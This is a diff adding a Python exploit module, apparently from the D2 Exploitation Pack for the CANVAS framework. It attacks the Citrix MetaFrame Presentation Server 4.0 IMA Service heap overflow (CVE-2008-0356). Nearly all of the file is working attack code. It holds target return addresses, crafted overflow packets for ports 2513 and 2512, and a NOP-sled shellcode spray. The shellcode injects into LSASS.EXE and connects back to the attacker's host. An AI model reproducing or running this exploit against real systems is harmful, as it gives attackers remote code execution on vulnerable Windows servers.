@@ -1,0 +1,143 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import random
+import time
+
+if "." not in sys.path: 
+		sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Citrix Metaframe Presentation Server 4.0 IMA Service Heap Overflow"
+
+DESCRIPTION = "Heap overflow vulnerability in Citrix Metaframe Presentation Server 4.0 IMA Service"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2008.01.17"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-08-002.html"
+DOCUMENTATION["VersionsAffected"] = "Citrix Metaframe Presentation Server 4.0/4.5"
+DOCUMENTATION["CVE Name"] = "CVE-2008-0356"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0356"
+DOCUMENTATION["Notes"]= """
+The exploit must be launched after some activities of IMA Service to work. There are two
+main targets one with standard installation of Citrix MPS 4.0 and a second one with the
+Hotfix Rollup Pack PSE400W2KR03 (MPS 4.0 English version) The exploit must be launched
+one more time if it doesn't work. Against Windows 2003 SP1/SP2 with MPS 4.5 the exploit 
+is a DoS.
+"""
+
+VERSION = "0.1"
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0: [ "Windows 2000 SP4 US + MPS 4.0", 0x77a241dd, 0x0041d454],  # add esp, 8 / ret + function pointer in imasrv.exe .data     
+    1: [ "Windows 2000 SP4 US + MPS 4.0 + HRP", 0x77a241dd, 0x0042049c],  # add esp, 8 / ret + function pointer in imasrv.exe .data
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 2513
+        self.version = 1        
+        self.badstring = "\x00"
+        return
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]
+        
+    def createShellcode(self):        
+        host = self.callback.ip
+        port = self.callback.port
+        
+        return self.createHeapSafeInjectIntoProcess(self.badstring, host, port, smallcode=1, processname="LSASS.EXE", backupprocess="lsass.exe")
+        
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))                
+        
+        # Write4
+        # _except_handler3 catches the second overwrite exception (access violation when writing)
+        # so there isn't any crash of imasrv.exe
+        os_name, src, dst = targets[self.version]
+        self.log("Target: %s"%(os_name)) 
+        
+        mysrc = pr = str(struct.pack('<L', src))
+        mydst = pr = str(struct.pack('<L', dst))
+        
+        sploitstring = "\xff\xff\xff\xff" + "\x09\x00\x09\x00\x00\x40\x00\x00" + mysrc + mydst
+	               
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))                        
+        s.sendall(sploitstring)                  
+
+        # Trigger the shellcode
+        nop = "\x90"*0x349
+        tmp = nop[0:4]
+        tmp += self.shellcode
+        tmp += nop[4 + len(self.shellcode):]
+	
+        sploitstring2 =  "\x49\x03\x00\x00\x81\x00\x00\x00\x02\xc0" + tmp	          
+	                
+        for i in range(200):
+          time.sleep(0.5)        	
+          s2 = self.gettcpsock()
+          s2.connect((self.host, 2512))
+          s2.sendall(sploitstring2)                            
+
+
+        if self.ISucceeded():
+            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+            self.log("%s done (succeeded!)" % self.name)
+            return 1
+        
+        return 0            
+        		
+    def usage(self):        
+        print "Usage: %s -v version -t host -l localip -d localport\n" % sys.argv[0]
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
